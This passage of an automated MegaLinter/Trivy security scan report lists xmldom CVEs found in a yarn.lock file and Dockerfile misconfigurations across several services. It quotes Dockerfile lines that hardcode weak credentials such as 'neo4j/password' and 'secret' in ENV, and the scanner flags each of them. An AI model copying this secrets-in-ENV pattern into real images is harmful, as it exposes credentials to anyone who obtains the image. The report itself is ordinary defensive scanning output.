     = xmldom is a pure JavaScript W3C standard-based (XML DOM Level 2 Core) `DOMParser` and `XMLSerializer` module. xmldom parses XML that is not well-formed because it contains multiple top level elements, and adds all root nodes to the `childNodes` collection of the `Document`, without reporting any error or throwing. This breaks the assumption that there is only a single root node in the tree, which led to issuance of CVE-2022-39299 as it is a potential issue for dependents. Update to @xmldom/xmldom@~0.7.7, @xmldom/xmldom@~0.8.4 (dist-tag latest) or @xmldom/xmldom@>=0.9.0-beta.4 (dist-tag next). As a workaround, please one of the following approaches depending on your use case: instead of searching for elements in the whole DOM, only search in the `documentElement`or reject a document with a document that has more then 1 `childNode`.

error: Package: xmldom
Installed Version: 0.1.31
Vulnerability CVE-2026-34601
Severity: HIGH
Fixed Version: 
Link: [CVE-2026-34601](https://avd.aquasec.com/nvd/cve-2026-34601)
     ┌─ tests/element/yarn.lock:6026:1
     │  
6026 │ ╭ xmldom@0.1.x:
6027 │ │   version "0.1.31"
6028 │ │   resolved "https://registry.yarnpkg.com/xmldom/-/xmldom-0.1.31.tgz#HIDDEN_BY_MEGALINTER"
6029 │ │   integrity sha512-yS2uJflVQs6n+CyjHoaBmVSqIDevTAWrzMmjG1Gc7h1qQ7uVozNhEPJAwZXWyGQ/Gafo3fCwrcaokezLPupVyQ==
     │ ╰^
     │  
     = xmldom: xmldom: XML structure injection via CDATA terminator
     = xmldom is a pure JavaScript W3C standard-based (XML DOM Level 2 Core) `DOMParser` and `XMLSerializer` module. In xmldom versions 0.6.0 and prior and @xmldom/xmldom prior to versions 0.8.12 and 0.9.9, xmldom/xmldom allows attacker-controlled strings containing the CDATA terminator ]]> to be inserted into a CDATASection node. During serialization, XMLSerializer emitted the CDATA content verbatim without rejecting or safely splitting the terminator. As a result, data intended to remain text-only became active XML markup in the serialized output, enabling XML structure injection and downstream business-logic manipulation. This issue has been patched in xmldom version 0.6.0 and @xmldom/xmldom versions 0.8.12 and 0.9.9.

warning: Package: xmldom
Installed Version: 0.1.31
Vulnerability CVE-2021-21366
Severity: MEDIUM
Fixed Version: 0.5.0
Link: [CVE-2021-21366](https://avd.aquasec.com/nvd/cve-2021-21366)
     ┌─ tests/element/yarn.lock:6026:1
     │  
6026 │ ╭ xmldom@0.1.x:
6027 │ │   version "0.1.31"
6028 │ │   resolved "https://registry.yarnpkg.com/xmldom/-/xmldom-0.1.31.tgz#HIDDEN_BY_MEGALINTER"
6029 │ │   integrity sha512-yS2uJflVQs6n+CyjHoaBmVSqIDevTAWrzMmjG1Gc7h1qQ7uVozNhEPJAwZXWyGQ/Gafo3fCwrcaokezLPupVyQ==
     │ ╰^
     │  
     = xmldom: incorrect parsing and serialization leads to unexpected behavior
     = xmldom is a pure JavaScript W3C standard-based (XML DOM Level 2 Core) DOMParser and XMLSerializer module. xmldom versions 0.4.0 and older do not correctly preserve system identifiers, FPIs or namespaces when repeatedly parsing and serializing maliciously crafted documents. This may lead to unexpected syntactic changes during XML processing in some downstream applications. This is fixed in version 0.5.0. As a workaround downstream applications can validate the input and reject the maliciously crafted documents.

warning: Package: xmldom
Installed Version: 0.1.31
Vulnerability CVE-2021-32796
Severity: MEDIUM
Fixed Version: 
Link: [CVE-2021-32796](https://avd.aquasec.com/nvd/cve-2021-32796)
     ┌─ tests/element/yarn.lock:6026:1
     │  
6026 │ ╭ xmldom@0.1.x:
6027 │ │   version "0.1.31"
6028 │ │   resolved "https://registry.yarnpkg.com/xmldom/-/xmldom-0.1.31.tgz#HIDDEN_BY_MEGALINTER"
6029 │ │   integrity sha512-yS2uJflVQs6n+CyjHoaBmVSqIDevTAWrzMmjG1Gc7h1qQ7uVozNhEPJAwZXWyGQ/Gafo3fCwrcaokezLPupVyQ==
     │ ╰^
     │  
     = nodejs-xmldom: misinterpretation of malicious XML input
     = xmldom is an open source pure JavaScript W3C standard-based (XML DOM Level 2 Core) DOMParser and XMLSerializer module. xmldom versions 0.6.0 and older do not correctly escape special characters when serializing elements removed from their ancestor. This may lead to unexpected syntactic changes during XML processing in some downstream applications. This issue has been resolved in version 0.7.0. As a workaround downstream applications can validate the input and reject the maliciously crafted documents.

error: Artifact: appserver/Dockerfile
Type: dockerfile
Vulnerability DS-0029
Severity: HIGH
Message: '--no-install-recommends' flag is missed: 'apt-get update     && apt-get install -y liblmdb-dev python3-dev libxml2-dev libxslt-dev build-essential     && apt-get clean'
Link: [DS-0029](https://avd.aquasec.com/misconfig/ds-0029)
   ┌─ appserver/Dockerfile:20:1
   │  
20 │ ╭ RUN apt-get update \
21 │ │     && apt-get install -y liblmdb-dev python3-dev libxml2-dev libxslt-dev build-essential \
22 │ │     && apt-get clean
   │ ╰^
   │  
   = 'apt-get' missing '--no-install-recommends'
   = 'apt-get' install should use '--no-install-recommends' to minimize image size.

error: Artifact: appserver/Dockerfile
Type: dockerfile
Vulnerability DS-0029
Severity: HIGH
Message: '--no-install-recommends' flag is missed: 'apt-get update     && apt-get install -y libmagic-dev graphviz libgraphviz-dev     && apt-get clean'
Link: [DS-0029](https://avd.aquasec.com/misconfig/ds-0029)
   ┌─ appserver/Dockerfile:41:1
   │  
41 │ ╭ RUN apt-get update \
42 │ │     && apt-get install -y libmagic-dev graphviz libgraphviz-dev \
43 │ │     && apt-get clean
   │ ╰^
   │  
   = 'apt-get' missing '--no-install-recommends'
   = 'apt-get' install should use '--no-install-recommends' to minimize image size.

error: Artifact: appserver/Dockerfile
Type: dockerfile
Vulnerability DS-0031
Severity: CRITICAL
Message: Possible exposure of secret env "JWT_SECRET" in ENV
Link: [DS-0031](https://avd.aquasec.com/misconfig/ds-0031)
   ┌─ appserver/Dockerfile:72:1
   │
72 │ ENV JWT_SECRET=secret
   │ ^
   │
   = Secrets passed via `build-args` or envs or copied secret files
   = Passing secrets via `build-args` or envs or copying secret files can leak them out

error: Artifact: appserver/Dockerfile
Type: dockerfile
Vulnerability DS-0031
Severity: CRITICAL
Message: Possible exposure of secret env "NEO4J_AUTH" in ENV
Link: [DS-0031](https://avd.aquasec.com/misconfig/ds-0031)
   ┌─ appserver/Dockerfile:90:1
   │
90 │ ENV NEO4J_AUTH=neo4j/password
   │ ^
   │
   = Secrets passed via `build-args` or envs or copied secret files
   = Passing secrets via `build-args` or envs or copying secret files can leak them out

error: Artifact: appserver/Dockerfile
Type: dockerfile
Vulnerability DS-0031
Severity: CRITICAL
Message: Possible exposure of secret env "NLP_SECRET" in ENV
Link: [DS-0031](https://avd.aquasec.com/misconfig/ds-0031)
    ┌─ appserver/Dockerfile:106:1
    │
106 │ ENV NLP_SECRET=secret
    │ ^
    │
    = Secrets passed via `build-args` or envs or copied secret files
    = Passing secrets via `build-args` or envs or copying secret files can leak them out

error: Artifact: appserver/Dockerfile
Type: dockerfile
Vulnerability DS-0031
Severity: CRITICAL
Message: Possible exposure of secret env "POSTGRES_PASSWORD" in ENV
Link: [DS-0031](https://avd.aquasec.com/misconfig/ds-0031)
   ┌─ appserver/Dockerfile:84:1
   │
84 │ ENV POSTGRES_PASSWORD=postgres
   │ ^
   │
   = Secrets passed via `build-args` or envs or copied secret files
   = Passing secrets via `build-args` or envs or copying secret files can leak them out

error: Artifact: appserver/Dockerfile
Type: dockerfile
Vulnerability DS-0031
Severity: CRITICAL
Message: Possible exposure of secret env "SENDGRID_API_KEY" in ENV
Link: [DS-0031](https://avd.aquasec.com/misconfig/ds-0031)
    ┌─ appserver/Dockerfile:112:1
    │
112 │ ENV SENDGRID_API_KEY=
    │ ^
    │
    = Secrets passed via `build-args` or envs or copied secret files
    = Passing secrets via `build-args` or envs or copying secret files can leak them out

note: Artifact: cache-invalidator/Dockerfile
Type: dockerfile
Vulnerability DS-0026
Severity: LOW
Message: Add HEALTHCHECK instruction in your Dockerfile
Link: [DS-0026](https://avd.aquasec.com/misconfig/ds-0026)
  ┌─ cache-invalidator/Dockerfile:1:1
  │
1 │ # ========================================
  │ ^
  │
  = No HEALTHCHECK defined
  = You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.

error: Artifact: cache-invalidator/Dockerfile
Type: dockerfile
Vulnerability DS-0031
Severity: CRITICAL
Message: Possible exposure of secret env "NEO4J_AUTH" in ENV
Link: [DS-0031](https://avd.aquasec.com/misconfig/ds-0031)
   ┌─ cache-invalidator/Dockerfile:50:1
   │
50 │ ENV NEO4J_AUTH=neo4j/password
   │ ^
   │
   = Secrets passed via `build-args` or envs or copied secret files
   = Passing secrets via `build-args` or envs or copying secret files can leak them out

error: Artifact: cache-invalidator/Dockerfile
Type: dockerfile
Vulnerability DS-0031
Severity: CRITICAL
Message: Possible exposure of secret env "REDIS_PASSWORD" in ENV
Link: [DS-0031](https://avd.aquasec.com/misconfig/ds-0031)
   ┌─ cache-invalidator/Dockerfile:57:1
   │
57 │ ENV REDIS_PASSWORD=password
   │ ^
   │
   = Secrets passed via `build-args` or envs or copied secret files
   = Passing secrets via `build-args` or envs or copying secret files can leak them out

error: Artifact: client/Dockerfile
Type: dockerfile
Vulnerability DS-0002
Severity: HIGH
Message: Specify at least 1 USER command in Dockerfile with non-root user as argument
Link: [DS-0002](https://avd.aquasec.com/misconfig/ds-0002)
  ┌─ client/Dockerfile:1:1
  │
1 │ ARG NODE_IMAGE_TAG=node:20
  │ ^
  │
  = Image user should not be 'root'
  = Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.

error: Artifact: docker/elasticsearch.Dockerfile
Type: dockerfile
Vulnerability DS-0002
Severity: HIGH
Message: Specify at least 1 USER command in Dockerfile with non-root user as argument
Link: [DS-0002](https://avd.aquasec.com/misconfig/ds-0002)
  ┌─ docker/elasticsearch.Dockerfile:1:1
  │
1 │ ARG ELASTICSEARCH_VERSION=7.16.3
  │ ^
  │
  = Image user should not be 'root'
  = Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.

note: Artifact: docker/elasticsearch.Dockerfile
Type: dockerfile
Vulnerability DS-0026
Severity: LOW
Message: Add HEALTHCHECK instruction in your Dockerfile
Link: [DS-0026](https://avd.aquasec.com/misconfig/ds-0026)
  ┌─ docker/elasticsearch.Dockerfile:1:1
  │
1 │ ARG ELASTICSEARCH_VERSION=7.16.3
  │ ^
  │
  = No HEALTHCHECK defined
  = You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.

error: Artifact: graph-db/migrator/Dockerfile
Type: dockerfile
Vulnerability DS-0002
Severity: HIGH
Message: Specify at least 1 USER command in Dockerfile with non-root user as argument
Link: [DS-0002](https://avd.aquasec.com/misconfig/ds-0002)
  ┌─ graph-db/migrator/Dockerfile:1:1
  │
1 │ ARG LIQUIBASE_IMAGE_TAG=4.7.1
  │ ^
  │
  = Image user should not be 'root'
  = Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.

note: Artifact: graph-db/migrator/Dockerfile
Type: dockerfile
Vulnerability DS-0026
Severity: LOW
Message: Add HEALTHCHECK instruction in your Dockerfile
Link: [DS-0026](https://avd.aquasec.com/misconfig/ds-0026)
  ┌─ graph-db/migrator/Dockerfile:1:1
  │
1 │ ARG LIQUIBASE_IMAGE_TAG=4.7.1
  │ ^
  │
  = No HEALTHCHECK defined
  = You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.

error: Artifact: graph-db/migrator/Dockerfile
Type: dockerfile
Vulnerability DS-0031
Severity: CRITICAL
Message: Possible exposure of secret env "AZURE_ACCOUNT_STORAGE_KEY" in ENV
Link: [DS-0031](https://avd.aquasec.com/misconfig/ds-0031)
   ┌─ graph-db/migrator/Dockerfile:47:1
   │
47 │ ENV AZURE_ACCOUNT_STORAGE_KEY=
   │ ^
   │
   = Secrets passed via `build-args` or envs or copied secret files
   = Passing secrets via `build-args` or envs or copying secret files can leak them out

error: Artifact: graph-db/migrator/Dockerfile
Type: dockerfile
Vulnerability DS-0031
Severity: CRITICAL
Message: Possible exposure of secret env "NEO4J_PASSWORD" in ENV
Link: [DS-0031](https://avd.aquasec.com/misconfig/ds-0031)
   ┌─ graph-db/migrator/Dockerfile:38:1
   │
38 │ ENV NEO4J_PASSWORD=neo4j
   │ ^
   │
   = Secrets passed via `build-args` or envs or copied secret files
   = Passing secrets via `build-args` or envs or copying secret files can leak them out

error: Artifact: statistical-enrichment/Dockerfile
Type: dockerfile
Vulnerability DS-0029
Severity: HIGH
Message: '--no-install-recommends' flag is missed: 'apt-get update && apt-get install -y curl && apt-get clean'
Link: [DS-0029](https://avd.aquasec.com/misconfig/ds-0029)
   ┌─ statistical-enrichment/Dockerfile:36:1
   │
36 │ RUN apt-get update && apt-get install -y curl && apt-get clean
   │ ^
   │
   = 'apt-get' missing '--no-install-recommends'
   = 'apt-get' install should use '--no-install-recommends' to minimize image size.

error: Artifact: statistical-enrichment/Dockerfile
Type: dockerfile
Vulnerability DS-0031
Severity: CRITICAL
Message: Possible exposure of secret env "NEO4J_AUTH" in ENV
Link: [DS-0031](https://avd.aquasec.com/misconfig/ds-0031)
   ┌─ statistical-enrichment/Dockerfile:53:1
   │
53 │ ENV NEO4J_AUTH=neo4j/password
   │ ^
   │
   = Secrets passed via `build-args` or envs or copied secret files
   = Passing secrets via `build-args` or envs or copying secret files can leak them out

error: Artifact: statistical-enrichment/Dockerfile
Type: dockerfile
Vulnerability DS-0031
Severity: CRITICAL
Message: Possible exposure of secret env "REDIS_PASSWORD" in ENV
Link: [DS-0031](https://avd.aquasec.com/misconfig/ds-0031)
   ┌─ statistical-enrichment/Dockerfile:59:1
   │
59 │ ENV REDIS_PASSWORD=password
   │ ^
   │
   = Secrets passed via `build-args` or envs or copied secret files
   = Passing secrets via `build-args` or envs or copying secret files can leak them out

warning: 31 warnings emitted
error: 70 errors emitted
```

</details>

See detailed reports in MegaLinter artifacts
_Set `VALIDATE_ALL_CODEBASE: true` in mega-linter.yml to validate all sources, not only the diff_

[![MegaLinter is graciously provided by OX Security](https://raw.githubusercontent.com/oxsecurity/megalinter/main/docs/assets/images/ox-banner.png)](https://www.ox.security/?ref=megalinter)
Show us your support by [**starring ⭐ the repository**](https://github.com/oxsecurity/megalinter)